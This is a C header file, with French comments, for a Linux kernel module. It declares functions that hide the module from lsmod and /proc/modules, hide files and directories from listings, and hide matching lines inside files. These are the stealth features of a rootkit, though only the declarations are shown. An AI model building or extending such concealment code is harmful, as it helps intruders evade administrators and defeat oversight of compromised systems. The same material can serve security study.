#ifndef HIDE_H
#define HIDE_H

#include <linux/fs.h>
#include <linux/dcache.h>

// Init / Exit
int  hide_init(void);
void hide_exit(void);

// Cache le module de lsmod / /proc/modules
void hide_module(void);

// Cache un fichier ou dossier d'un listing
void hide_file(const char *name);
void unhide_file(const char *name);

// Cache des lignes dans un fichier
void hide_line(const char *filename, const char *pattern);
void unhide_line(const char *filename, const char *pattern);

#endif
